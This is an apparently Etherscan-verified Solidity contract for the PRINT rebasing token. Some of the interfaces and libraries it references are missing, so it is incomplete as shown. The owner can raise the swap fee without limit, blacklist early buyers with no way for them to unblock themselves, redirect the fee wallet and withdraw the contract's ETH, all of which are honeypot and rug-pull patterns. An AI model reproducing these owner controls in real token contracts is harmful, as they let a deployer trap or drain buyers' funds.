/**
 *Submitted for verification at Etherscan.io on 2021-08-19
*/

/**
 *Submitted for verification at Etherscan.io on 2021-08-08
*/

/**
 *Submitted for verification at Etherscan.io on 2021-07-23
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}







contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

} 

// pragma solidity >=0.5.0;




// pragma solidity >=0.5.0;



// pragma solidity >=0.6.2;





// pragma solidity >=0.6.2;

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract PRINT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    
    address public deployer = 0x2D407dDb06311396fE14D4b49da5F0471447d45C;
    address payable public walletAddress = payable(0x3BE5b419bD5b5E6Eb2318d6CD210128FEf7Eb3E9);
    
    string private _name = 'Printer Finance';
    string private _symbol = 'PRINT';
    uint8 private _decimals = 18;
    
    uint256 private constant MAX_UINT256 = ~uint256(0);
    uint256 private constant INITIAL_FRAGMENTS_SUPPLY = 1 * 1e6 * 1e18;
    uint256 private constant TOTAL_GONS = MAX_UINT256 - (MAX_UINT256 % INITIAL_FRAGMENTS_SUPPLY);
    
    uint256 public constant MAG = 10 ** 18;
    uint256 public rateOfChange = MAG;

    uint256 private _totalSupply;
    uint256 public _gonsPerFragment;
    
    mapping(address => uint256) public _gonBalances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping(address => bool) public blacklist;
    mapping (address => uint256) public _buyInfo;

    uint256 public _percentForTxLimit = 1; //2% of total supply;
    uint256 public _percentForRebase = 5; //5% of total supply;
    uint256 public _timeLimitFromLastBuy = 3 minutes;
    uint256 public _fee = 4;
    uint256 private uniswapV2PairAmount;
    
    bool public _live = false;
    bool inSwapAndLiquify;
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    event SwapTokensForETH(uint256 amountIn, address[] path);
    
    
    constructor () {
        _totalSupply = INITIAL_FRAGMENTS_SUPPLY;
        _gonBalances[_msgSender()] = TOTAL_GONS;
        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);
        
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        emit Transfer(deployer, _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if(account == uniswapV2Pair)
            return uniswapV2PairAmount;
        return _gonBalances[account].div(_gonsPerFragment);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function setFeeRate(uint256 fee) external onlyOwner {
        _fee = fee;
    }
    
    function rebasePlus(uint256 _amount) private {
         _totalSupply = _totalSupply.add((_amount*1000).div(1449));
        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "ERC20: Transfer amount must be greater than zero");
        
        if (from != owner() && to != owner()) {
            uint256 txLimitAmount = _totalSupply.mul(_percentForTxLimit).div(100);
            
            require(amount <= txLimitAmount, "ERC20: amount exceeds the max tx limit.");

            if(from != uniswapV2Pair) {
                require(!blacklist[from] && !blacklist[to], 'ERC20: No bots allowed.');
                require(_buyInfo[from] == 0 || _buyInfo[from].add(_timeLimitFromLastBuy) < block.timestamp, "ERC20: Tx not allowed yet.");
                
                uint256 contractTokenBalance = balanceOf(address(this));
                
                if (!inSwapAndLiquify && to == uniswapV2Pair) {
                    if (contractTokenBalance > 0) {
                        if (contractTokenBalance > txLimitAmount) {
                            contractTokenBalance = txLimitAmount;
                        }
                        swapTokens(contractTokenBalance);
                    }
                }

                //take fee only on swaps
                if (
                    (from == uniswapV2Pair || to == uniswapV2Pair) &&
                    !(from == address(this) || to == address(this))
                ) {
                    _tokenTransfer(from, to, amount, _fee);
                }
                else {
                    _tokenTransfer(from, to, amount, 0);
                }
            }
                
            else {
                if(!_live)
                    blacklist[to] = true;
        
                require(balanceOf(to) + amount <= txLimitAmount*2, 'ERC20: current balance exceeds the max limit.');
                
                _buyInfo[to] = block.timestamp;
                _tokenTransfer(from, to, amount, _fee);

                uint256 rebaseLimitAmount = _totalSupply.mul(_percentForRebase).div(100);
                uint256 currentBalance = balanceOf(to);
                uint256 newBalance = currentBalance.add(amount);
                if(currentBalance < rebaseLimitAmount && newBalance < rebaseLimitAmount) {
                    rebasePlus(amount);
                }
            }
        } else {
            _tokenTransfer(from, to, amount, 0);
        }
    }
    
    function _tokenTransfer(address from, address to, uint256 amount, uint256 taxFee) internal {
        if(to == uniswapV2Pair)
            uniswapV2PairAmount = uniswapV2PairAmount.add(amount);
        else if(from == uniswapV2Pair)
            uniswapV2PairAmount = uniswapV2PairAmount.sub(amount);
        
        uint256 feeAmount = 0;
        
        if (taxFee != 0) {
            feeAmount = amount.mul(taxFee).div(100);
        }

        uint256 transferAmount = amount.sub(feeAmount);
        
        uint256 gonTotalValue = amount.mul(_gonsPerFragment);
        uint256 gonValue = transferAmount.mul(_gonsPerFragment);
        uint256 gonFeeAmount = feeAmount.mul(_gonsPerFragment);
        
        _gonBalances[from] = _gonBalances[from].sub(gonTotalValue);
        _gonBalances[to] = _gonBalances[to].add(gonValue);
        
        emit Transfer(from, to, transferAmount);
        
        if(gonFeeAmount > 0)
            _gonBalances[address(this)] = _gonBalances[address(this)].add(gonFeeAmount);
    }
    
    function swapTokens(uint256 contractTokenBalance) private lockTheSwap {
        swapTokensForEth(contractTokenBalance);

        uint256 contractETHBalance = address(this).balance;
        if (contractETHBalance > 0) {
            sendETHToWallet(address(this).balance);
        }
    }

    function sendETHToWallet(uint256 amount) private {
        walletAddress.call{value: amount}("");
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

        emit SwapTokensForETH(tokenAmount, path);
    }
    
    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}
    
    function emergencyWithdraw() external onlyOwner {
        payable(owner()).send(address(this).balance);
    }
    
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }
    
    function setWalletAddress(address _walletAddress) external onlyOwner {
        walletAddress = payable(_walletAddress);
    }
    
    function updateLive() external {
        if(!_live) {
            _live = true;
        }
    }
    
    function unblockWallet(address account) public onlyOwner {
        blacklist[account] = false;
    }
    
    function updatePercentForTxLimit(uint256 percentForTxLimit) public onlyOwner {
        require(percentForTxLimit >= 1, 'ERC20: max tx limit should be greater than 1');
        _percentForTxLimit = percentForTxLimit;
    }
}